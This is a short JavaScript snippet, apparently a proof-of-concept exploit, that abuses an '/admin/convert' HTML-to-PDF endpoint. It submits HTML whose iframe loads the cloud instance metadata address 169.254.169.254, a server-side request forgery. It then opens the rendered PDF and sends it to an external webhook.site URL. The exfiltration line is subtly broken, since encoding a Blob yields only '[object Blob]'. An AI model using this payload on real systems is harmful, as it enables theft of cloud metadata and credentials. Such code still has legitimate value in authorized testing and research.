const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/'></iframe></body>";
const pdfUrl = "/admin/convert";
const webhookUrl = "https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39";

fetch(pdfUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ htmlCode })
})
.then(response => response.blob())
.then(blob => {
  const pdfContent = encodeURIComponent(blob);
  const webhookUrlWithQueryParams = `${webhookUrl}?pdfContent=${pdfContent}`;
  const url = URL.createObjectURL(blob);
  window.open(url, '_blank');
  fetch(webhookUrlWithQueryParams);
})
.catch(error => console.log(error));
